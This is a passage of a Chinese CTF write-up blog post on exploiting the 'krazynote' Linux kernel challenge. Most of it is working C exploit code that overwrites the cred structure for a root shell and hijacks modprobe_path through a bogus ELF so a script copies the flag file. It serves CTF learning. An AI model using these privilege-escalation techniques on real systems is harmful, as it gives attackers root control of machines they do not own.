+<p>利用任意地址读来寻找这个字符串，它的前一个成员就是cred结构体，cred结构体前面是real cred结构体，通常情况下它们的值是一样的，从而爆破出cred结构体所在地址。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (prctl(PR_SET_NAME, <span class="string">"ChineseAuxyTQL"</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		errExit(<span class="string">"prctl set name failed"</span>);</span><br><span class="line">	<span class="keyword">uintptr_t</span>* task;</span><br><span class="line">        <span class="keyword">size_t</span> off;</span><br><span class="line">	<span class="keyword">for</span> (off = <span class="number">0</span>;; off += <span class="number">0x100</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">		fake_note[<span class="number">1</span>] = <span class="number">0xff</span> ^ key;</span><br><span class="line">		fake_note[<span class="number">2</span>] = off ^ key;</span><br><span class="line">		edit(<span class="number">1</span>, buffer, <span class="number">0x18</span>);</span><br><span class="line">		<span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">		show(<span class="number">2</span>, buffer);</span><br><span class="line">		task = (<span class="keyword">uintptr_t</span>*)memmem(</span><br><span class="line">			buffer, <span class="number">0x100</span>, <span class="string">"ChineseAuxyTQL"</span>, <span class="number">14</span>);</span><br><span class="line">                <span class="comment">//comm,cred,real cred</span></span><br><span class="line">		<span class="keyword">if</span> (task != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[*] found: %p 0x%lx 0x%lx\n"</span>, task, task[<span class="number">-1</span>], task[<span class="number">-2</span>]);</span><br><span class="line">			<span class="keyword">if</span> (task[<span class="number">-1</span>] &gt; <span class="number">0xffff000000000000</span> &amp;&amp; task[<span class="number">-2</span>] &gt; <span class="number">0xffff000000000000</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>task[-1]是cred结构体，task[-2]是real cred结构体，然后修改cred结构体的成员uid~fsgid为0，一共修改8个成员，uid是cred结构体的第四个成员，注意这里要将目标地址减去page_offset_base，从而提权成功。这里也可以修改task[-1]，也就是cred结构体，也可以提权成功。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//real_cred &apos;s uid ~ fsgid</span><br><span class="line">fake_note[0] = 0 ^ key;</span><br><span class="line">fake_note[1] = 0x20 ^ key;</span><br><span class="line">fake_note[2] = (task[-2] + 4 - base_addr) ^ key;</span><br><span class="line">edit(1, buffer, 0x18);</span><br><span class="line">// calculate offset to cred, set it to note2</span><br><span class="line"></span><br><span class="line">int fake_cred[8];</span><br><span class="line">memset(fake_cred, 0, sizeof(fake_cred));</span><br><span class="line">edit(2, (char*)fake_cred, 0x20);</span><br><span class="line">// write uid~fsgid to 0, get root shell</span><br><span class="line"></span><br><span class="line">char* args[2] = &#123;&quot;/bin/sh&quot;, NULL&#125;;</span><br><span class="line">execv(&quot;/bin/sh&quot;, args);</span><br></pre></td></tr></table></figure></p>
+<p>execv函数会停止当前的进程，并以program进程替换被体制执行的进程，进程ID不会变化。函数原型如下，argv数组的第一个参数应该是program程序名，最后一个参数是NULL。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execv</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *program, <span class="keyword">char</span> *<span class="keyword">const</span> argv[])</span></span>;   <span class="comment">//#include &lt;unistd.h&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h2><p>与覆写cred结构体不同的是，在泄露page_offset_base之后，还需要泄露kernel_base，泄露kernel_base与泄露page_offset_base类似，同样读取某条指令的地址偏移。比如利用module_base+0x6c处的指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000006C                 call    _copy_from_user</span><br></pre></td></tr></table></figure></p>
+<p>cal指令的偏移量的计算方式是目标地址-call指令下一条指令的地址。我们首先将note2的contentPtr修改为module_base+0x6c+1，这里存储了偏移量，然后show note2读取到这个偏移量。读取到偏移量之后再加上call指令下一条指令的地址，得到的地址就是copy_from_user的地址。然后得到kernel_base，这里说一下我们前面泄露的module_base，也包括我们前面泄露到的地址，都是通过note2-&gt;contentPtr泄露到的，因为无论是add、edit还是show，程序中的contentPtr减去了page_offset_base，所以我们前面得到的module_base加上base_addr才是真正的模块加载基址。但为什么在进行泄露kernel_base之前就求出了真实的module_base了呢，导致后面泄露的时候fake_note[2]还需要减去base_addr，泄露完之后直接在copy_from_user里加上module_base和base_addr不就好了嘛。但是很玄学的一个问题，再泄露完rip_copy_from_user之后再一起求和得到copy_from_user的结果是错误的，此时module_base+base_addr的结果和在前面输出的结果不一样，很玄学的问题，终于明白为什么我参考的exp里是先将module_base计算好然后再泄露kernel_base了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> module_base = module_base + base_addr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//leak kernel base</span></span><br><span class="line"><span class="keyword">uintptr_t</span> copy_from_user_off = module_base + <span class="number">0x6c</span> + <span class="number">1</span>;</span><br><span class="line">fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key; <span class="comment">//note2-&gt;key = 0</span></span><br><span class="line">fake_note[<span class="number">1</span>] = <span class="number">8</span> ^ key; <span class="comment">//leak addr 64 bites</span></span><br><span class="line">fake_note[<span class="number">2</span>] = (copy_from_user_off - base_addr) ^ key;</span><br><span class="line">edit(<span class="number">1</span>,buffer,<span class="number">0x18</span>);</span><br><span class="line"><span class="keyword">int32_t</span> rip_copy_from_user;</span><br><span class="line">show(<span class="number">2</span>,(<span class="keyword">char</span>*)&amp;rip_copy_from_user);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"rip_copy_from_user=0x%x\n"</span>,rip_copy_from_user);</span><br><span class="line"><span class="comment">//printf("module_base=0x%lx\n",module_base);</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> copy_from_user = module_base + <span class="number">0x71</span> + rip_copy_from_user;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"copy_from_user=0x%lx\n"</span>,copy_from_user);</span><br></pre></td></tr></table></figure></p>
+<p>泄露kernel_base的命令，终于知道怎么知道泄露的函数的地址与真实内核基址的偏移怎么得到了，我每次都是在gdb里尝试，如果不能访问再增加一些，通过startup_64可以泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep startup_64</span><br><span class="line">ffffffff81000000 T startup_64   //kernel base</span><br><span class="line">ffffffff81000030 T secondary_startup_64</span><br><span class="line">ffffffff810001f0 T __startup_64</span><br></pre></td></tr></table></figure></p>
+<p>对应exp部分就是：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uintptr_t</span> kernel_base = copy_from_user - <span class="number">0x353e80</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"kernel_base=0x%lx\n"</span>,kernel_base);</span><br></pre></td></tr></table></figure></p>
+<p>泄露内核基址之后计算得到modprobe_path的地址，然后利用一个错误的elf程序触发modprobe:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep modprobe_path</span><br><span class="line">ffffffff8205e0e0 D modprobe_path</span><br></pre></td></tr></table></figure></p>
+<p>有毒啊，我自己写的就会导致重启，使用别人没有修改的exp就可以读取flag，哎，利用cred也是这样。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = copy_from_user - (<span class="number">0xae553e80</span><span class="number">-0xae200000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"kernel_base = 0x%lx\n"</span>, kernel_base);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//hijack modprobe_path</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> modprobe_path = kernel_base + (<span class="number">0xb1c5e0e0</span> - <span class="number">0xb0c00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"modprobe_path = %lx\n"</span>, modprobe_path);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">memset(buf, '\x00', 0x50);</span><br><span class="line"><span class="built_in">strcpy</span>(buf, <span class="string">"/home/note/copy.sh\0"</span>);</span><br><span class="line">fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">fake_note[<span class="number">1</span>] = <span class="number">0x20</span> ^ key;</span><br><span class="line">fake_note[<span class="number">2</span>] = (modprobe_path - base_addr) ^ key;</span><br><span class="line">edit(<span class="number">1</span>, buffer, <span class="number">0x18</span>);</span><br><span class="line">edit(<span class="number">2</span>, buf, <span class="number">20</span>);</span><br><span class="line">        </span><br><span class="line">system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /home/note/flag\n/bin/chmod 777 /home/note/flag' &gt; /home/note/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/note/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/note/dummy"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/note/dummy"</span>);</span><br><span class="line">system(<span class="string">"/home/note/dummy"</span>);</span><br><span class="line">system(<span class="string">"cat flag"</span>);</span><br><span class="line"></span><br><span class="line">getchar();</span><br></pre></td></tr></table></figure></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/krazynote.c" target="_blank" rel="noopener">https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/krazynote.c</a><br><a href="https://www.jianshu.com/p/a70a358ec02c" target="_blank" rel="noopener">https://www.jianshu.com/p/a70a358ec02c</a><br><a href="https://pr0cf5.github.io/ctf/2019/10/10/balsn-ctf-krazynote.html" target="_blank" rel="noopener">https://pr0cf5.github.io/ctf/2019/10/10/balsn-ctf-krazynote.html</a><br><a href="http://man7.org/linux/man-pages/man2/userfaultfd.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/userfaultfd.2.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux-kernel-pwn/" rel="tag"># Linux kernel pwn</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/24/hackme/" rel="next" title="starctf 2019 hackme">
+                <i class="fa fa-chevron-left"></i> starctf 2019 hackme
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/23/leetcode之动态规划-medium部分/" rel="prev" title="leetcode之动态规划 medium部分">
+                leetcode之动态规划 medium部分 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目描述"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#调试过程中遇到的错误"><span class="nav-number">2.</span> <span class="nav-text">调试过程中遇到的错误</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用过程"><span class="nav-number">3.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#别名页"><span class="nav-number">3.1.</span> <span class="nav-text">别名页</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#userfaultfd"><span class="nav-number">3.2.</span> <span class="nav-text">userfaultfd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#覆写cred结构体"><span class="nav-number">3.3.</span> <span class="nav-text">覆写cred结构体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#modprobe-path"><span class="nav-number">3.4.</span> <span class="nav-text">modprobe_path</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
